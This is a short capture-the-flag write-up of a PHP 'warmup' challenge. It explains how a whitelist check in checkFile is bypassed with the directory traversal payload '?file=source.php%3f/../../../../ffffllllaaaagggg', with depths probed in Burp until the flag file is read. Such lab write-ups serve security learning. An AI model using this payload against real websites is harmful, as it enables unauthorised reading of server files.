
# warmup  
  
![Screenshot from 2021-07-24 22-04-46](https://user-images.githubusercontent.com/87865134/126872559-500d8562-582d-44a8-b5fe-05209425fee2.png)

- Hint: in source code  

![Screenshot from 2021-07-24 22-05-44](https://user-images.githubusercontent.com/87865134/126872594-0e5b5035-a9ec-49a0-bf30-9475a3d09946.png)

- View file ***source.php***  

![Screenshot from 2021-07-24 22-07-47](https://user-images.githubusercontent.com/87865134/126872652-d614b39e-f637-40fd-83ad-3d53efbdcbb9.png)  
![Screenshot from 2021-07-24 22-08-07](https://user-images.githubusercontent.com/87865134/126872665-c914d17e-ec34-45c6-b275-46e0f23544e8.png)

- View file ***hint.php***:  

![Screenshot from 2021-07-24 22-11-29](https://user-images.githubusercontent.com/87865134/126872747-869ffda3-9c95-4134-b7eb-2c40023743ac.png)

  - > Flag in file ***ffffllllaaaagggg***
  
- **function checkFile(&$page)**: 
  -  check if file in whitelist or not
  -  $page not change after fucntion return  
    - => can bypass function by use payload: `?file=source.php%3f/../ffffllllaaaagggg` 
 
- **Use Burp to send some requests**:
  - `?file=source.php%3f/../ffffllllaaaagggg` => not found
  - `?file=source.php%3f/../../ffffllllaaaagggg` => not found
  - `?file=source.php%3f/../../../ffffllllaaaagggg` => not found
  - `?file=source.php%3f/../../../../ffffllllaaaagggg` => found
 
![Screenshot from 2021-07-24 22-24-53](https://user-images.githubusercontent.com/87865134/126873191-d4cfb6a0-52ed-4997-a90b-e59554a3aad0.png)


- **Description**: 
  - > category: directory traversal
